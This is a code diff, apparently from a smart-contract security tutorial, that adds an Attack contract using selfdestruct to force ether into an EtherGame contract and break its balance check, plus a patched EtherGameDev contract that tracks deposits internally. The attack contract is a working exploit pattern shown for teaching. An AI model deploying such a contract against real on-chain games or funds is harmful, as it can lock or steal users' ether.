@@ -40,3 +40,43 @@ contract EtherGame {
   }
 }
 
+contract Attack {
+  EtherGame etherGame;
+
+  constructor(EtherGame _etherGame) {
+    etherGame = EtherGame(_etherGame);
+  }
+
+  function attack() public payable {
+    // you can simply break the game by sending ether
+    // the game balance >= 7 ether
+
+    // cast address to payable
+    address payable addr = payable(address(etherGame));
+    selfdestruct(addr);
+  }
+}
+
+contract EtherGameDev {
+  uint public targetAmount = 7 ether;
+  uint public balance;
+  address public winner;
+
+  function deposit() public payable {
+    require(msg.value == 1 ether, "You can only send 1 Ether");
+
+    balance += msg.value;
+    require(balance <= targetAmount, "Game is over");
+
+    if (balance == targetAmount) {
+      winner = msg.sender;
+    }
+  }
+
+  function claimReward() public {
+    require(msg.sender == winner, "Not winner");
+
+    (bool sent, ) = msg.sender.call{value: balance}("");
+    require(sent, "Failed to send Ether");
+  }
+}
